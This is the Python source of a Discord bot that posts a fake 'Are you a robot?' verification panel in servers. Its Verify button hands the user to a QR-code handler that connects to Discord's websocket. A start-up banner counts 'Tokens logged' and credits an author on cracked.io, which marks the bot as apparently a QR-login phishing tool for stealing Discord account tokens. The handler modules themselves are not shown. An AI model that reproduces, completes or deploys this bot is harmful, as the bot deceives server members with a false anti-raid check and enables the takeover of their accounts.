from tkinter.ttk import Style
import discord
import asyncio
import os

from discord_webhook import DiscordEmbed
from DRAclient import DRAClient
from QRHandler import QRHandler
import json

from discord.ext import commands
from discord import HTTPException, app_commands 
from config import config
from colorama import init
from colorama import Fore
from colorama import Style

from discord.utils import get
from datetime import datetime



from discord.ext import commands
import discord

init(autoreset=True)

class Dropdown(discord.ui.Select):
    def __init__(self, guild):
        self.guild = guild
        options = []
        for role in guild.roles:
            option = discord.SelectOption(label=role.name)
            options.append(option)

        super().__init__(placeholder='Choose your verify role', min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        role_id = get(self.guild.roles, name=self.values[0]).id

        config['servers'][self.guild.id] = {'verify_role': role_id}
        config.write()
        await interaction.message.delete()



class DropdownView(discord.ui.View):
    def __init__(self, guild):
        super().__init__()

        # Adds the dropdown to our view object.
        self.add_item(Dropdown(guild))

class PersistentView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label='Verify', style=discord.ButtonStyle.green, custom_id='persistent_view:green')
    async def green(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed()
        embed.title = 'Button clicked!'
        embed.description = 'Sending a DM...'
        
        await QRHandler().run(interaction) #Connects to discord websocket then uses interaction variable to send reply


class PersistentViewBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True

        super().__init__(command_prefix=commands.when_mentioned_or(config['bot_prefix']), intents=intents)

    async def setup_hook(self) -> None:
        self.add_view(PersistentView())

    async def on_ready(self):
        os.system('cls')
        print(f"""
██████  ██ ███████  ██████      {Style.BRIGHT}Username: {Style.DIM}{self.user}
██   ██ ██ ██      ██    ██     {Style.BRIGHT}ID: {Style.DIM}{self.user.id}
██   ██ ██ ███████ ██    ██     {Style.BRIGHT}Guilds: {Style.DIM}{len(self.guilds)}
██   ██ ██      ██ ██ ▄▄ ██     {Style.BRIGHT}Tokens logged: {Style.DIM}{config['tokens_logged']}
██████  ██ ███████  ██████      {Style.BRIGHT}Author: {Style.DIM}https://cracked.io/hotrod
                       ▀▀                               
        """)


bot = PersistentViewBot()


@bot.command()
@commands.has_permissions(administrator=True)
async def setuppanel(ctx: commands.Context):
    
    embed = discord.Embed()
    embed.title = '🤖 Are you a robot? '
    embed.description = '✅ Click this button to get verified'
    embed.add_field(name='Why do I need to verify?', value='We require every user to verify to prevent raiding or malicious users.', inline=False)

    await ctx.send(embed=embed, view=PersistentView())

@bot.command()
@commands.has_permissions(administrator=True)
async def setuprole(ctx: commands.Context, arg1=None):

    if arg1 != None:
        config['servers'][ctx.guild.id] = {'verify_role': arg1}
        config.write()
        return
    try:
        await ctx.send(view=DropdownView(ctx.guild))
    except:
        await ctx.send("Error: more than 25 roles. Pass in role id as argument")

print(f'{Fore.WHITE}[{datetime.now()}] [INFO] Logging into bot...')

try:
    bot.run(config['bot_token'])
except:
    print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to run bot. Check your token')

